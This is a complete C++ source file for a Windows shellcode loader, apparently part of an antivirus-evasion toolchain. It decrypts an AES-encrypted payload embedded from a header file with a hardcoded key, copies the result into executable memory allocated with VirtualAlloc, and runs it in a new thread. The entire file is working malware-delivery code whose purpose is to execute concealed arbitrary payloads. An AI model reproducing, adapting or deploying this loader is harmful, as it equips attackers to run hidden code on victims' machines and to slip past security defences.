#include <windows.h>         // Windows API (VirtualAlloc, CreateThread)
#include <wincrypt.h>        // CryptoAPI for AES decryption
#include <iostream>          // For std::cout / std::cerr
#include "embedded_payload.h" // This contains the encrypted shellcode as an array

#pragma comment(lib, "crypt32.lib") // Link the CryptoAPI library at compile time

// AES key must match the Python script's key exactly
const BYTE aesKey[16] = { 'T','h','i','s','I','s','A','1','6','B','y','t','e','K','e','y' };

// Function to decrypt AES-encrypted payload in memory
bool DecryptAES(BYTE* encData, DWORD encLen, BYTE* outBuf, DWORD& outLen) {
    BYTE iv[16];                         // To hold the extracted IV (first 16 bytes)
    memcpy(iv, encData, 16);             // Extract IV

    BYTE* cipherText = encData + 16;     // Ciphertext follows IV
    DWORD cipherLen = encLen - 16;

    memcpy(outBuf, cipherText, cipherLen); // Copy ciphertext to output buffer (for in-place decryption)

    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    HCRYPTHASH hHash;

    // Acquire a crypto context from Windows CryptoAPI
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return false;

    // Create SHA-256 hash object
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) return false;

    // Hash the AES key
    if (!CryptHashData(hHash, aesKey, sizeof(aesKey), 0)) return false;

    // Derive AES-128 key from the hash
    if (!CryptDeriveKey(hProv, CALG_AES_128, hHash, 0, &hKey)) return false;

    // Set IV for decryption
    if (!CryptSetKeyParam(hKey, KP_IV, iv, 0)) return false;

    outLen = cipherLen;

    // Perform in-place decryption
    if (!CryptDecrypt(hKey, 0, TRUE, 0, outBuf, &outLen)) return false;

    return true;
}

int main() {
    // Allocate memory for decrypted payload
    BYTE* decrypted = new BYTE[payload_len];
    DWORD decryptedLen = 0;

    // Try to decrypt the embedded AES-encrypted payload
    if (!DecryptAES(payload, payload_len, decrypted, decryptedLen)) {
        std::cerr << "[-] Decryption failed.\n";
        return 1;
    }

    // Allocate RWX memory for the shellcode
    LPVOID mem = VirtualAlloc(NULL, decryptedLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) {
        std::cerr << "[-] VirtualAlloc failed.\n";
        return 1;
    }

    // Copy the decrypted shellcode into the allocated memory
    memcpy(mem, decrypted, decryptedLen);

    // Create a new thread to execute the shellcode
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    if (!hThread) {
        std::cerr << "[-] CreateThread failed.\n";
        return 1;
    }

    // Wait for the thread to complete (i.e., shellcode finishes)
    WaitForSingleObject(hThread, INFINITE);

    // Clean up
    delete[] decrypted;
    return 0;
}
